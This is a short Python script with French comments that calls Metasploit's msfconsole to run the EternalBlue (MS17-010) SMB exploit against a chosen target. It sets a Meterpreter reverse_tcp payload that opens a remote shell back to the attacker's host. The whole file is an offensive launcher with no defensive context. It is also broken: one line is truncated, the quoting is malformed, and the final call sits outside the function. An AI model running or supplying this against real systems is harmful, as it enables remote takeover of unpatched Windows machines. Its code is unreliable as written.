import subprocess

def run(target, lhost, lport=4444):
    print("[*] Exécution de EternalBlue avec Metasploit...")

    # Commande brute depuis l'alias que tu utilises dans ton shell
    cmd = [
        "bash", "-c",  # Exécute en mode shell
        "BUNDLE_GEMFILE=/opt/tools/metasploit-framework/Gemfile "
        "/usr/local/rvm/gems/ruby-3.1.5@metasploit-framework/wrappers/bundle>
        "/opt/tools/metasploit-framework/msfconsole -q -x ""
        f"use exploit/windows/smb/ms17_010_eternalblue; "
        f"set RHOSTS {target}; "
        f"set LHOST {lhost}; "
        f"set LPORT {lport}; "
        f"set PAYLOAD windows/x64/meterpreter/reverse_tcp; "
        f"set EXITFUNC thread; "
        f"exploit -z; exit""
    ]
subprocess.run(cmd)